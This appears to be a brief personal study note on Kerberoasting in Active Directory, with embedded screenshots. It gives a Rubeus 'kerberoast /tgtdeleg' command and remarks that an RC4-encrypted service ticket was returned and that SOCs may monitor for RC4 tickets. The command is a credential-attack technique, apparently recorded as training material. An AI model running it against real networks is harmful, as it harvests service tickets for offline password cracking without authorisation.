Default kerberoast
![[Pasted image 20240917090259.png]]

Encrypted kerberoast
![[Pasted image 20240917090311.png]]
```
F:\Rubeus\Rubeus.exe kerberoast /tgtdeleg
```

Even though AES encryption is supported by both parties, a TGS ticket encrypted with RC4 (encryption type 0x17/23) was returned. Note that SOCs may be monitoring for tickets encrypted with RC4:
![[Pasted image 20240917090352.png]]
